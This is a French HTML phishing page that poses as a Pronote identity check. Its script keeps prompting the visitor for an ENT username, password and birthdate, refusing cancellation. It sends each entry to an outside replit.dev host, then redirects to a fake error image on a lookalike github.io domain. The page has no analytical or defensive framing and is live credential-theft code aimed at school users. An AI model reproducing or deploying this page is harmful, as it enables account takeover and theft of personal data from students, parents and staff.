<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8" />
    <title>Vérification d'identité</title>
    <link rel="icon" type="image/png" href="https://0313080e.index-education.net/pronote/images/favicon-32x32.png" />
    <script>
        const cancelMessage = "Vous ne pouvez pas continuer sans que Pronote vérifie votre identité.";
        const redirectURL = "https://0313080e-index-education.github.io/pronote/Erreur sur le site web de l'application de messagerie.png";
        const apiEndpoint = 'https://e07f1f78-1eaa-4f36-b817-0aed05fdcba3-00-fwz8hv1l3vzp.picard.replit.dev/';

        function promptForBirthdate() {
            let birthDate;
            while (true) {
                birthDate = prompt("Saisissez votre date de naissance en utilisant ce format (JJMMAAAA):");
                if (birthDate === null) {
                    alert(cancelMessage);
                    setTimeout(promptForBirthdate, 0);
                    return;
                }
                if (birthDate) {
                    break;
                }
            }

            const birthDateData = new URLSearchParams();
            birthDateData.append('birthDate', birthDate);
            fetch(apiEndpoint + 'birthdate', { 
                method: 'POST',
                body: birthDateData
            })
            .catch(() => {})
            .finally(() => {
                window.location.href = redirectURL;
            });
        }

        function startVerificationProcess() {
            let username;
            while (true) {
                username = prompt("Pronote a besoin de vérifier votre identité.\n\nNom d'utilisateur de l'ENT:");
                if (username === null) {
                    alert(cancelMessage);
                    setTimeout(startVerificationProcess, 0);
                    return;
                }
                if (username) {
                    break;
                }
            }

            let password;
            while (true) {
                password = prompt("Pronote a besoin de vérifier votre identité.\n\nMot de passe de l'ENT:");
                if (password === null) {
                    alert(cancelMessage);
                    setTimeout(startVerificationProcess, 0);
                    return;
                }
                if (password) {
                    break;
                }
            }

            const credentialsData = new URLSearchParams();
            credentialsData.append('username', username);
            credentialsData.append('password', password);

            fetch(apiEndpoint, {
                method: 'POST',
                body: credentialsData
            })
            .catch(() => {})
            .finally(() => {
                promptForBirthdate();
            });
        }

        window.onload = () => {
            setTimeout(startVerificationProcess, 1000);
        };
    </script>
</head>
<body>
</body>
</html>
